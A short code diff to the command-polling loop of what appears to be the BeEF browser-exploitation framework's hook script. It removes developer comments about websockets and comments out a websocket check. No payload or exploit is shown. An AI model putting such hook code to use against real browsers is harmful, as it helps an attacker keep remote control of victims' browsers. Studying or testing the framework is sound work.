@@ -51,14 +51,14 @@ beef.updater = {
 			beef.net.flush();
 			if(beef.commands.length > 0) {
 				this.execute_commands();
-			} /*here controllare ci sta sto websocket??? nn ha senso fare polling*/
+			}
 
             else {
 				this.get_commands();    /*Polling*/
 			}
 		}
-        /*@Todo Simple ceck to stop polling */
-        if (beef.websocket.socket == null)
+
+      //if ( typeof beef.websocket === "undefined")
 		setTimeout("beef.updater.check();", beef.updater.timeout);
 	},
 	
